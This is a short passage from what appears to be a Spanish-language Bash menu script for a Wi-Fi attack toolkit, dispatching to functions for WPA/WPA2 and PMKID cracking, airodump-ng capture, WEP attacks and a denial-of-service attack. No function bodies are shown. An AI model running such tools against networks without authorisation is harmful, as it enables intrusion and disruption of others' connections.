    select_wifi
  ;;
  5)
    Desencriptar_WPA2WPA
  ;;
  6)
    Launcher_airodump-ng
  ;;
  7)
    Attack_Dos
  ;;
  8)
    Attack_Wep
  ;;
  9)
    Attack_PMKID
  ;;
  10)
    Desencriptar_PMKID
  ;;
  99)
    dependencies
  ;;
  *)
    printf "\n  Selecciona la opcion correcta porfavor."
    printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
    read -p ""
  ;;
esac
done
